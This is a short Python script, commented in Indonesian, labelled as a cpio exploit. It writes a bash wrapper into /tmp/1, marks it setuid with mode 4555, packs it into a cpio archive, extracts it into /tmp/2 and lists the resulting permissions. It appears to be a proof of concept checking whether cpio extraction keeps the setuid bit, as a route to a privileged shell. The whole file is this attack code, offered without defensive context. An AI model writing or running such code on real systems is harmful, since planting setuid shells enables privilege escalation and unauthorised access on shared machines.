import os

def create_cpio_exploit():
    # Membuat direktori dan file setuid
    os.makedirs("/tmp/1", exist_ok=True)
    os.chdir("/tmp/1")
    with open("a", "w") as file:
        file.write("#!/bin/bash\n\n/bin/bash")
    os.chmod("a", 0o4555)

    # Membuat arsip cpio
    os.system("echo -n a | cpio -ocv0 > a.cpio")

def extract_cpio_exploit():
    # Mengekstrak arsip cpio
    os.makedirs("/tmp/2", exist_ok=True)
    os.chdir("/tmp/2")
    os.system("cpio -iv < ../1/a.cpio")
    
    # Menampilkan hak akses file hasil ekstraksi
    os.system("ls -lh /tmp/2/a")

if __name__ == "__main__":
    # Membuat dan mengekstrak arsip cpio
    create_cpio_exploit()
    extract_cpio_exploit()
